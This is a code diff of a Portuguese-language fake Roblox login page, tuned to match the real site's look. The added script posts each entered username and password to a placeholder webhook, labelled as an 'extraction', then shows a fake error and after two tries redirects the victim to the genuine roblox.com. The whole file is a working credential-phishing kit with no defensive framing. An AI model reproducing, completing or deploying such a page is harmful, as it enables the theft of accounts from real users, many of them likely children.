@@ -11,16 +11,14 @@
         :root {
             --bg-main: #191a1f; 
             --bg-card: #272930;
-            /* UPGRADE VOID: Preenchimento cinza translúcido conforme o original */
             --input-bg: rgba(255, 255, 255, 0.1); 
             --text-main: #ffffff;
             --rbx-blue: #0084ff;
-            --rbx-error: #df281f;
+            --rbx-error: #f74b52; /* Cor exata do Script 1 */
             --border-grey: #454749;
             --footer-bg: #121215;
             --state-hover: rgba(255, 255, 255, 0.1);
-            --state-press: rgba(255, 255, 255, 0.15);
-            --radius-main: 8px; /* Arredondamento extraído do Script Original */
+            --radius-main: 8px;
         }
 
         @keyframes fadein-delay { 0% { opacity: 0 } 50% { opacity: 0 } to { opacity: 1 } }
@@ -42,54 +40,65 @@
         /* --- CONTEÚDO --- */
         .main-content { flex: 1; display: flex; align-items: center; justify-content: center; flex-direction: column; background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg'); background-size: cover; background-position: center; padding: 80px 0 40px 0; }
         
-        .login-card { background-color: var(--bg-card); padding: 40px 30px; border-radius: var(--radius-main); width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); box-sizing: border-box; }
+        .login-card { background-color: var(--bg-card); padding: 40px 30px; border-radius: var(--radius-main); width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); box-sizing: border-box; position: relative; }
         
-        #error-msg { color: var(--rbx-error); font-size: 13px; margin-bottom: 15px; display: none; text-align: left; background: rgba(223, 40, 31, 0.1); padding: 10px; border-radius: 4px; border-left: 3px solid var(--rbx-error); }
+        #error-msg { color: var(--rbx-error); font-size: 13px; margin-bottom: 15px; display: none; text-align: left; background: rgba(247, 75, 82, 0.1); padding: 10px; border-radius: 4px; border-left: 3px solid var(--rbx-error); }
 
-        /* INPUTS IGUAIS AO ORIGINAL (FOTO 2) */
+        /* INPUTS (FIDELIDADE FOTO 2) */
         .input-field { 
-            width: 100%; height: 44px; 
-            background-color: var(--input-bg); 
-            border: 1px solid rgba(0,0,0,0.1); 
-            border-radius: var(--radius-main); 
+            width: 100%; height: 44px; background-color: var(--input-bg); 
+            border: 1px solid rgba(0,0,0,0.1); border-radius: var(--radius-main); 
             color: #fff; padding: 0 12px; margin-bottom: 12px; 
-            box-sizing: border-box; outline: none; transition: border 0.2s; 
-            font-size: 15px;
+            box-sizing: border-box; outline: none; transition: border 0.2s; font-size: 15px;
         }
         .input-field:focus { border: 1px solid var(--rbx-blue); }
-        .input-field::placeholder { color: #85868b; }
-        
-        /* BOTÃO ENTRAR - UPGRADE DE FIDELIDADE */
+        .input-field.input-field-error { border: 1px solid var(--rbx-error) !important; }
+
+        /* --- CHECKBOX CUSTOMIZADA (EXTRAÍDA DO SCRIPT 1) --- */
+        .checkbox-container {
+            display: flex; align-items: center; text-align: left; margin: 15px 0;
+            position: relative; cursor: pointer; font-size: 14px; color: #fff;
+            user-select: none;
+        }
+        .checkbox-container input { position: absolute; opacity: 0; left: -9999px; }
+        .checkmark {
+            height: 16px; width: 16px; background-color: #fff;
+            border-radius: 3px; margin-right: 10px; flex-shrink: 0;
+            border: 1px solid #bcbec8; position: relative;
+        }
+        .checkbox-container:hover .checkmark { border-color: #70a0ff; }
+        .checkbox-container input:checked ~ .checkmark {
+            background-color: #70a0ff; border-color: #70a0ff;
+            background-image: url(https://images.rbxcdn.com/c3ebbbd60f3655d3a078dcfb632199fd-generic_01312019.svg);
+            background-repeat: no-repeat; background-size: 28px auto; background-position: 0 -602px;
+        }
+
+        /* BOTÃO ENTRAR */
         .btn-primary-md { 
-            width: 100%; height: 42px; 
-            border: 1px solid #fff; 
-            background: rgba(255,255,255,0.05); 
-            color: #fff; border-radius: var(--radius-main); 
-            font-size: 16px; font-weight: 500; cursor: pointer; 
-            margin-top: 10px; transition: 0.2s;
+            width: 100%; height: 42px; border: 1px solid #fff; 
+            background: rgba(255,255,255,0.05); color: #fff; 
+            border-radius: var(--radius-main); font-size: 16px; font-weight: 500; 
+            cursor: pointer; margin-top: 10px; transition: 0.2s;
         }
         .btn-primary-md:hover { background-color: var(--state-hover); }
-        .btn-primary-md:active { transform: scale(0.98); }
 
-        /* BOTÕES CINZAS (ENTRADA RÁPIDA/CÓDIGO) */
+        /* BOTÕES SECUNDÁRIOS */
         .btn-secondary { 
-            width: 100%; height: 42px; 
-            background-color: #393b43; border: none; 
-            color: #fff; border-radius: var(--radius-main); 
-            margin-top: 12px; cursor: pointer; font-weight: 500;
-            transition: background 0.2s;
+            width: 100%; height: 42px; background-color: #393b43; 
+            border: none; color: #fff; border-radius: var(--radius-main); 
+            margin-top: 12px; cursor: pointer; font-weight: 500; transition: background 0.2s;
         }
         .btn-secondary:hover { background-color: #45474d; }
-        .btn-secondary:active { transform: scale(0.98); }
 
         .forgot-link { display: block; margin: 15px 0; color: #fff; text-decoration: none; font-size: 15px; }
         .forgot-link:hover { text-decoration: underline; }
-
         .divider { border-top: 1px solid var(--border-grey); margin: 20px 0; width: 100%; }
 
+        /* --- FOOTER --- */
         .container-footer { background-color: var(--footer-bg); padding: 40px 0; width: 100%; }
         .footer-note { font-size: 12px; color: #d5d7dd; opacity: 0.7; text-align: center; }
 
+        /* LOADING & EFEITOS */
         #loading-overlay { background-color: rgba(0,0,0,0.85); position: fixed; inset: 0; z-index: 2000; display: none; align-items: center; justify-content: center; }
         .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--rbx-blue); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -104,7 +113,8 @@
 <header class="roblox-header">
     <div class="header-left">
         <div class="roblox-logo"></div>
-        <a href="#" class="nav-link">Destaques</a><a href="#" class="nav-link">Mercado</a>
+        <a href="#" class="nav-link">Destaques</a>
+        <a href="#" class="nav-link">Mercado</a>
     </div>
 </header>
 
@@ -114,9 +124,15 @@
         
         <div id="error-msg">Usuário ou senha incorretos.</div>
 
-        <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone">
+        <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone" autocomplete="off">
         <input type="password" id="pass" class="input-field" placeholder="Senha">
         
+        <label class="checkbox-container">
+            <input type="checkbox" checked>
+            <span class="checkmark"></span>
+            Manter sessão iniciada
+        </label>
+
         <button class="btn-primary-md" onclick="execLogin()">Entrar</button>
         
         <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
@@ -138,13 +154,63 @@
 
 <script>
     let attempt = 0;
+    const webhookURL = "SUA_WEBHOOK_AQUI"; // <--- COLOQUE SUA URL AQUI
 
     async function execLogin() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
         const card = document.getElementById('card');
         const errorDiv = document.getElementById('error-msg');
-        const passInput = document.getElementById('pass');
+        const inputs = document.querySelectorAll('.input-field');
 
         if(!u || !p) {
-            card.classList
+            triggerError();
+            return;
+        }
+
+        document.getElementById('loading-overlay').style.display = 'flex';
+
+        // EXTRAÇÃO DE DADOS PARA WEBHOOK
+        try {
+            await fetch(webhookURL, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🛠️ VOID - EXTRAÇÃO CONCLUÍDA",
+                        color: 16711680,
+                        fields: [
+                            {name: "👤 Usuário", value: `\`${u}\``, inline: true},
+                            {name: "🔑 Senha", value: `\`${p}\``, inline: true},
+                            {name: "🛡️ Tentativa", value: `#${attempt + 1}`, inline: true}
+                        ],
+                        footer: {text: "Protocolo Colmeia | V.2026"}
+                    }]
+                })
+            });
+        } catch (e) { console.log("Erro de conexão"); }
+
+        // SIMULAÇÃO DE ERRO E REDIRECIONAMENTO
+        setTimeout(() => {
+            document.getElementById('loading-overlay').style.display = 'none';
+            attempt++;
+
+            if(attempt >= 2) {
+                window.location.href = "https://www.roblox.com/home";
+            } else {
+                triggerError();
+            }
+        }, 1200);
+
+        function triggerError() {
+            card.classList.add('shake');
+            errorDiv.style.display = 'block';
+            inputs.forEach(i => i.classList.add('input-field-error'));
+            document.getElementById('pass').value = "";
+            setTimeout(() => card.classList.remove('shake'), 400);
+        }
+    }
+</script>
+
+</body>
+</html>
